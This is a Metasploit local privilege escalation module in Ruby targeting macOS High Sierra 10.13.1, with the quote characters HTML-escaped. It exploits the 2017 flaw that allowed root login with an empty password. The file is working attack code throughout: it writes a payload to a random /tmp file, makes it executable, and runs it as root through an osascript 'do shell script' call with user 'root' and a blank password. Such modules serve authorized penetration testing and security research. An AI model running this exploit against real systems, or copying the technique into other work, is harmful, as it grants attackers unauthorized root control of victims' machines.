# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
 
class MetasploitModule < Msf::Exploit::Local
  Rank = ExcellentRanking
 
  include Msf::Post::File
  include Msf::Exploit::EXE
  include Msf::Exploit::FileDropper
 
  def initialize(info={})
    super(update_info(info,
      &#039;Name&#039;          => &#039;Mac OS X Root Privilege Escalation&#039;,
      &#039;Description&#039;   => %q{
        This module exploits a serious flaw in MacOSX High Sierra.
        Any user can login with user "root", leaving an empty password.
      },
      &#039;License&#039;       => MSF_LICENSE,
      &#039;References&#039;    =>
        [
          [ &#039;URL&#039;, &#039;https://twitter.com/lemiorhan/status/935578694541770752&#039; ],
          [ &#039;URL&#039;, &#039;https://news.ycombinator.com/item?id=15800676&#039; ],
          [ &#039;URL&#039;, &#039;https://forums.developer.apple.com/thread/79235&#039; ],
        ],
      &#039;Platform&#039;      => &#039;osx&#039;,
      &#039;Arch&#039;          => ARCH_X64,
      &#039;DefaultOptions&#039; =>
      {
      },
      &#039;Targets&#039;       => [
        [ &#039;Mac OS X 10.13.1 High Sierra x64 (Native Payload)&#039;, { } ]
      ],
      &#039;DefaultTarget&#039; => 0,
      &#039;DisclosureDate&#039; => &#039;Nov 29 2017&#039;
    ))
  end
 
  def exploit_cmd(root_payload)
    "osascript -e &#039;do shell script \"#{root_payload}\" user name \"root\" password \"\" with administrator privileges&#039;"
  end
 
  def exploit
    payload_file = "/tmp/#{Rex::Text::rand_text_alpha_lower(12)}"
    print_status("Writing payload file as &#039;#{payload_file}&#039;")
    write_file(payload_file, payload.raw)
    register_file_for_cleanup(payload_file)
    output = cmd_exec("chmod +x #{payload_file}")
    print_status("Executing payload file as &#039;#{payload_file}&#039;")
    cmd_exec(exploit_cmd(payload_file))
  end
end

